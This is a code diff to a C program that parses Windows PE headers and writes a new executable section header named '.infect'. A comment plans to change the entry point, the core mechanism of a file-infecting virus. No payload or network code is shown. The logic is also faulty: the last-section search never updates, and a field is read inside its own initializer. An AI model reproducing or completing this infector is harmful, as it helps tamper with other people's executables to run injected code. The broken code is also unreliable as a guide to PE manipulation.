@@ -39,6 +39,7 @@ int main(int argc, char *argv[]) {
 	// 0x20B => 64-bit
 	imageOptionalHeader.Magic = getval(fr, dw, SEEK_SET, ioh_addr);
 
+	// TO-DO: Change entry point
 	imageOptionalHeader.AddressOfEntryPoint =
 		getval(fr, dd, SEEK_SET, ioh_addr+16);
 	imageOptionalHeader.ImageBase =
@@ -51,34 +52,61 @@ int main(int argc, char *argv[]) {
 	imageOptionalHeader.SizeOfImage =
 		getval(fr, dd, SEEK_SET,ioh_addr + 56);
 
-	DWORD lastish_addr = ioh_addr + imageFileHeader.SizeOfOptionalHeader
-		+ 40 * (imageFileHeader.NumberOfSections-1);
+	// DWORD lastish_addr = ioh_addr + imageFileHeader.SizeOfOptionalHeader
+		// + 40 * (imageFileHeader.NumberOfSections-1);
+
+	// Find address of last section header
+	// Necessary? Not if section header is organised by the order of the sections' appearance in the programme
+	DWORD lastish_addr = 0;
+	for (int i = 0; i < imageFileHeader.NumberOfSections; i++) {
+		DWORD tempval = getval(fr,dd, SEEK_SET,
+			ioh_addr + imageFileHeader.SizeOfOptionalHeader + 40*i + 12);
+		if (tempval < lastish_addr)
+			lastish_addr = tempval;
+	}
+
+	IMAGE_SECTION_HEADER lastish;
+
+	lastish.VirtualAddress =
+		getval(fr, dd, SEEK_SET, lastish_addr + 12);
+	lastish.SizeOfRawData = getval(fr, dd, SEEK_SET, lastish_addr + 16);
 
 	DWORD newish_addr = lastish_addr + 40;
+	IMAGE_SECTION_HEADER newish = {
+		// Name
+		".infect",
+		// Misc.VirtualSize
+		0, // Edit to reflect actual size
+		// VirtualAddress
+		closest(lastish.VirtualAddress + lastish.SizeOfRawData, imageOptionalHeader.SectionAlignment),
+		// SizeOfRawData
+		closest(newish.Misc.VirtualSize,imageOptionalHeader.FileAlignment),
+		// PointerToRawData
+		0,
+		// PointerToRelocations
+		0,
+		// PointerToLinenumbers
+		0,
+		// NumberOfRelocations
+		0,
+		// NumberOfLinenumbers
+		0,
+		// Characteristics
+		0x60000060,
+			// IMAGE_SCN_CNT_CODE | IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ
+			// 0x00000020 | 0x00000040 | 0x20000000 | 0x40000000
+	};
 
-	// Section Header
-	// Name
-	setval_char(fr, ".infect",8, SEEK_SET, newish_addr);
-	// VirtualSize
-	setval_int(fr, 0, dd, SEEK_CUR, 0);
-	// VirtualAddress
-	setval_int(fr, 0, dd, SEEK_CUR, 0);
-	// SizeOfRawData
-	setval_int(fr, 0, dd, SEEK_CUR, 0);
-	// PointerToRawData
-	setval_int(fr, 0, dd, SEEK_CUR, 0);
-	// PointerToRelocations
-	setval_int(fr, 0, dd, SEEK_CUR, 0);
-	// PointerToLinenumbers
-	setval_int(fr, 0, dd, SEEK_CUR, 0);
-	// NumberOfRelocations
-	setval_int(fr, 0, dd, SEEK_CUR, 0);
-	// NumberOfLinenumbers
-	setval_int(fr, 0, dd, SEEK_CUR, 0);
-	// Characteristics
-	setval_int(fr, 0, dd, SEEK_CUR, 0);
-
-
+	setval_char(fr, newish.Name,8, SEEK_SET, newish_addr);
+	setval_int(fr, newish.Misc.VirtualSize, dd, SEEK_CUR, 0);
+	setval_int(fr, newish.VirtualAddress, dd, SEEK_CUR, 0);
+	setval_int(fr, newish.SizeOfRawData, dd, SEEK_CUR, 0);
+	setval_int(fr, newish.PointerToRawData, dd, SEEK_CUR, 0);
+	setval_int(fr,newish.PointerToRelocations, dd, SEEK_CUR, 0);
+	setval_int(fr, newish.PointerToLinenumbers, dd, SEEK_CUR, 0);
+	setval_int(fr, newish.NumberOfRelocations, dw, SEEK_CUR, 0);
+	setval_int(fr, newish.NumberOfLinenumbers, dw, SEEK_CUR, 0);
+	setval_int(fr, newish.Characteristics, dd, SEEK_CUR, 0);
 
 	end(fr, 0);
 }
